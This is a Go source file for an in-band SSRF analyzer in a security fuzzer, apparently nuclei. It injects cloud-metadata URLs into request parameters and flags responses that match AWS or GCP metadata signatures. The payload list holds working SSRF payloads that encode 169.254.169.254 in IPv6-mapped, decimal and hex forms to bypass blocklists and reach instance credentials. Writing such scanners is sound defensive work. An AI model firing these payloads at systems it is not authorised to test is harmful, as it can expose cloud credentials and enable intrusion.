// Package ssrf implements an in-band server-side request forgery analyzer for
// the fuzzer.
//
// It injects URLs pointing at cloud instance-metadata endpoints (AWS IMDS, GCP
// metadata) using several IP-encoding bypasses, and confirms a hit only when
// the response body contains a signature unique to those metadata services.
// This catches the high-impact, in-band SSRF case where the application fetches
// the attacker-supplied URL and reflects the metadata back (frequently leaking
// cloud credentials). Blind SSRF requires out-of-band correlation and is out of
// scope for this self-contained analyzer.
package ssrf

import (
	"regexp"
	"strconv"
	"strings"

	"github.com/projectdiscovery/nuclei/v3/pkg/fuzz/analyzers"
)

const analyzerName = "ssrf"

// Analyzer implements the analyzers.Analyzer interface for in-band SSRF.
type Analyzer struct{}

var _ analyzers.Analyzer = &Analyzer{}

func init() {
	analyzers.RegisterAnalyzer(analyzerName, &Analyzer{})
}

func (a *Analyzer) Name() string {
	return analyzerName
}

func (a *Analyzer) ApplyInitialTransformation(data string, params map[string]interface{}) string {
	return analyzers.ApplyPayloadTransformations(data)
}

// metadataPayloads target cloud metadata services. 169.254.169.254 is encoded
// several ways (IPv6-mapped, decimal, hex) to bypass naive blocklists.
var metadataPayloads = []string{
	"http://169.254.169.254/latest/meta-data/",
	"http://169.254.169.254/latest/dynamic/instance-identity/document",
	"http://[::ffff:a9fe:a9fe]/latest/meta-data/",
	"http://2852039166/latest/meta-data/",
	"http://0xa9fea9fe/latest/meta-data/",
	"http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true",
}

var (
	// AWS instance-identity document JSON
	reAWSInstanceID = regexp.MustCompile(`"instanceId"\s*:\s*"i-[0-9a-f]{8,17}"`)
	reAWSImageID    = regexp.MustCompile(`"imageId"\s*:\s*"ami-[0-9a-f]{8,17}"`)
	// AWS STS credentials surfaced from IMDS (keys begin with ASIA)
	reAWSCreds = regexp.MustCompile(`"AccessKeyId"\s*:\s*"ASIA[0-9A-Z]{16,}"`)
)

// MatchSSRFSignature returns the metadata service whose signature appears in
// body, if any. It is exported and pure for unit-testing without a network.
func MatchSSRFSignature(body string) (string, bool) {
	if body == "" {
		return "", false
	}
	if reAWSCreds.MatchString(body) {
		return "AWS instance credentials (IMDS)", true
	}
	if reAWSInstanceID.MatchString(body) && reAWSImageID.MatchString(body) {
		return "AWS instance identity document (IMDS)", true
	}
	// AWS IMDS metadata listing: several well-known keys appear together.
	if strings.Contains(body, "ami-id") &&
		strings.Contains(body, "instance-id") &&
		strings.Contains(body, "instance-action") {
		return "AWS IMDS metadata", true
	}
	// GCP metadata recursive responses carry these structural keys together.
	// NOTE: we deliberately do NOT match a bare "computeMetadata" substring: it
	// appears in the injected request URL itself (…/computeMetadata/v1/…), so an
	// application that merely reflects the payload would otherwise be a false
	// positive. Requiring response-only JSON keys keeps this in-band signal high
	// confidence.
	if strings.Contains(body, "\"machineType\"") && strings.Contains(body, "\"serviceAccounts\"") {
		return "GCP instance metadata", true
	}
	return "", false
}

// Analyze injects metadata SSRF payloads and reports a hit when a metadata
// signature appears that was not present in the baseline response.
func (a *Analyzer) Analyze(options *analyzers.Options) (bool, string, error) {
	if options == nil || options.FuzzGenerated.Component == nil || options.HttpClient == nil {
		return false, "", nil
	}
	gr := options.FuzzGenerated

	defer func() {
		_ = gr.Component.SetValue(gr.Key, gr.OriginalValue)
	}()

	baselineBody, err := analyzers.SendValueAndReadBody(options, gr.OriginalValue)
	if err != nil {
		return false, "", err
	}
	if _, matched := MatchSSRFSignature(baselineBody); matched {
		return false, "", nil
	}

	for _, payload := range metadataPayloads {
		body, err := analyzers.SendValueAndReadBody(options, payload)
		if err != nil {
			continue
		}
		if svc, matched := MatchSSRFSignature(body); matched {
			return true, "ssrf: " + svc + " disclosed via payload " + strconv.Quote(payload), nil
		}
	}
	return false, "", nil
}
